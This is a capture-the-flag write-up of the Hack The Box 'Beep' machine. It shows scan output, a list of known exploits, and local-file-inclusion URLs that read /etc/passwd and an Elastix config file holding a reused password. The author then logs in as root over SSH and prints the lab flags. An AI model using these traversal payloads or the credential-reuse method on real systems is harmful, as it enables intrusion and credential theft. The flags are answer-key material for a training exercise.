
<head>
    <link rel="stylesheet" href="css/retro.css">
</head>

## HTB-Beep (10.10.10.7)

### Summary
---
![Bastard](images/beep.png)
This was a medium difficulty system for me to enumerate due to the many port/applications open for possible exploitation.

---
### Scanning/Enumeration
---
#### nmap 
    Nmap scan report for 10.10.10.7
    Host is up (0.070s latency).
    Not shown: 988 closed ports
    PORT      STATE SERVICE    VERSION
    22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
    |_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
    25/tcp    open  smtp       Postfix smtpd
    |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
    80/tcp    open  http       Apache httpd 2.2.3
    |_http-server-header: Apache/2.2.3 (CentOS)
    |_http-title: Did not follow redirect to https://10.10.10.7/
    |_https-redirect: ERROR: Script execution failed (use -d to debug)
    110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
    |_pop3-capabilities: PIPELINING USER IMPLEMENTATION(Cyrus POP3 server v2) TOP AUTH-RESP-CODE UIDL APOP EXPIRE(NEVER) LOGIN-DELAY(0) RESP-CODES STLS
    |_ssl-cert: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: ERROR: Script execution failed (use -d to debug)
    |_sslv2: ERROR: Script execution failed (use -d to debug)
    |_tls-alpn: ERROR: Script execution failed (use -d to debug)
    |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
    111/tcp   open  rpcbind    2 (RPC #100000)
    143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
    |_imap-capabilities: Completed RIGHTS=kxte SORT CATENATE URLAUTHA0001 IMAP4rev1 X-NETSCAPE QUOTA MAILBOX-REFERRALS OK UIDPLUS LISTEXT STARTTLS ACL ID ATOMIC MULTIAPPEND CONDSTORE THREAD=ORDEREDSUBJECT RENAME IDLE LIST-SUBSCRIBED ANNOTATEMORE THREAD=REFERENCES SORT=MODSEQ BINARY CHILDREN UNSELECT NO NAMESPACE LITERAL+ IMAP4
    |_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
    |_ssl-cert: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: ERROR: Script execution failed (use -d to debug)
    |_sslv2: ERROR: Script execution failed (use -d to debug)
    |_tls-alpn: ERROR: Script execution failed (use -d to debug)
    |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
    443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-server-header: Apache/2.2.3 (CentOS)
    |_http-title: Elastix - Login page
    | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
    | Not valid before: 2017-04-07T08:22:08
    |_Not valid after:  2018-04-07T08:22:08
    |_ssl-date: 2020-02-17T21:42:58+00:00; +1h02m00s from scanner time.
    993/tcp   open  ssl/imap   Cyrus imapd
    |_imap-capabilities: CAPABILITY
    995/tcp   open  pop3       Cyrus pop3d
    |_ssl-cert: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: ERROR: Script execution failed (use -d to debug)
    |_ssl-known-key: ERROR: Script execution failed (use -d to debug)
    |_sslv2: ERROR: Script execution failed (use -d to debug)
    |_tls-alpn: ERROR: Script execution failed (use -d to debug)
    |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
    3306/tcp  open  mysql      MySQL (unauthorized)
    4445/tcp  open  upnotifyp?
    10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
    |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.80%E=4%D=2/17%OT=22%CT=1%CU=30841%PV=Y%DS=2%DC=T%G=Y%TM=5E4AFAB
    OS:A%P=x86_64-apple-darwin19.0.0)SEQ(SP=BE%GCD=1%ISR=C6%TI=Z%CI=Z%II=I%TS=A
    OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
    OS:DST11NW7%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0
    OS:)ECN(R=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
    OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW7
    OS:%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=
    OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
    OS:7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN
    OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

    Network Distance: 2 hops
    Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

    Host script results:
    |_clock-skew: 1h01m59s

    TRACEROUTE (using port 53/tcp)
    HOP RTT      ADDRESS
    1   67.43 ms 10.10.14.1
    2   67.51 ms 10.10.10.7

#### nikto
```
---------------------------------------------------------------------------
+ Target IP:          10.10.10.7
+ Target Hostname:    10.10.10.7
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:         Subject:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
                    Ciphers:  DHE-RSA-AES256-SHA
                    Issuer:   /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain
+ Start Time:       2020-02-17 14:01:54 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.2.3 (CentOS)
+ Retrieved x-powered-by header: PHP/5.1.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie elastixSession created without the secure flag
+ Cookie elastixSession created without the httponly flag
+ Server leaks inodes via ETags, header found with file /robots.txt, inode: 889199, size: 28, mtime: Thu Jan  7 22:43:28 2072
+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Hostname '10.10.10.7' does not match certificate's names: localhost.localdomain
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "https://127.0.0.1/images/".
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /help/: Help directory should not be accessible
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3268: /static/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /panel/: Admin login page/section found.
+ 8460 requests: 0 error(s) and 28 item(s) reported on remote host
```

#### http 
Visited and viewed source the following URLs:
* https://10.10.10.7/static
* https://10.10.10.7/mail/
* https://10.10.10.7/images/
* https://10.10.10.7/panel/
* https://10.10.10.7/vtigercrm/index.php
￼

### Vulnerabilities 
---

List of potential vulenerabilities: 
```
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (1)  | exploits/linux/remote/1813.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (2)  | exploits/multiple/remote/2053.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (3)  | exploits/linux/remote/2185.pl
————————————————————————————————————————————————
Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow | exploits/multiple/remote/2237.sh
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak           | exploits/linux/webapps/42745.py
Apache Struts 2.2.3 - Multiple Open Redirections           | exploits/multiple/remote/38666.txt
————————————————————————————————————————————————
Webmin 1.5 - Brute Force / Command Execution        | exploits/multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                  | exploits/multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit) | exploits/unix/remote/21851.rb
————————————————————————————————————————————————
Roundcube 1.2.2 - Remote Code Execution              | exploits/php/webapps/40892.txt
Roundcube Webmail - Multiple Vulnerabilities         | exploits/php/webapps/11036.txt
Roundcube Webmail 0.1 - 'index.php' Cross-Site Scrip | exploits/php/webapps/28988.txt
Roundcube Webmail 0.1 - CSS Expression Input Validat | exploits/php/webapps/30877.txt
Roundcube Webmail 0.2 - Cross-Site Scripting         | exploits/php/webapps/33473.txt
Roundcube Webmail 0.2-3 Beta - Code Execution        | exploits/php/webapps/7549.txt
Roundcube Webmail 0.2b - Remote Code Execution       | exploits/php/webapps/7553.sh
Roundcube Webmail 0.3.1 - Cross-Site Request Forgery | exploits/php/webapps/17957.txt
Roundcube Webmail 0.8.0 - Persistent Cross-Site Scri | exploits/php/webapps/20549.py
Roundcube Webmail 1.1.3 - Directory Traversal        | exploits/php/webapps/39245.txt
Roundcube rcfilters plugin 2.1.6 - Cross-Site Script | exploits/linux/webapps/45437.txt
————————————————————————————————————————————————
vTiger CRM 5.1.0 - Local File Inclusion              | exploits/php/webapps/18770.txt
————————————————————————————————————————————————
Elastix 2.2.0 - 'graph.php' Local File Inclusion
```

### Exploits

---
#### 1. Exploit the 'Local File Inclusion' vulnerabilities
vTiger CRM 5.1.0 - Local File Inclusion
* https://www.exploit-db.com/exploits/18770 
*  https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%0
```
root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache:x:94:94:Distcache:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash dbus:x:81:81:System message bus:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin spamfilter:x:500:500::/home/spamfilter:/bin/bash haldaemon:x:68:68:HAL daemon:/:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin fanis:x:501:501::/home/fanis:/bin/bash
```

Elastix 2.2.0 - 'graph.php' Local File Inclusion 
* https://www.exploit-db.com/exploits/37637
* https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

Getting a more promising list below with users names and passwords
```
# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# AMPBIN: Location of the FreePBX command line scripts
# AMPSBIN: Location of (root) command line scripts
#
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
#
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
# AMPWEBADDRESS=x.x.x.x|hostname

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE
```

#### 2. Get shell as root
User root/ jEhdIekWmdjE to ssh into beep:
```
ssh root@10.10.10.7
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root
[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
[root@beep ~]# cat /etc/redhat-release 
CentOS release 5.6 (Final)
[root@beep ~]# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
link/ether 00:50:56:b9:5d:e4 brd ff:ff:ff:ff:ff:ff
inet 10.10.10.7/24 brd 10.10.10.255 scope global eth0
[root@beep ~]# cd /root/
[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
[root@beep ~]# cat root.txt 
d88e006123842106982acce0aaf453f0
[root@beep ~]# cd /home/
[root@beep home]# ls
fanis  spamfilter
[root@beep home]# cd fanis/
[root@beep fanis]# ls
user.txt
[root@beep fanis]# cat user.txt
aeff3def0c765c2677b94715cffa73ac
```
---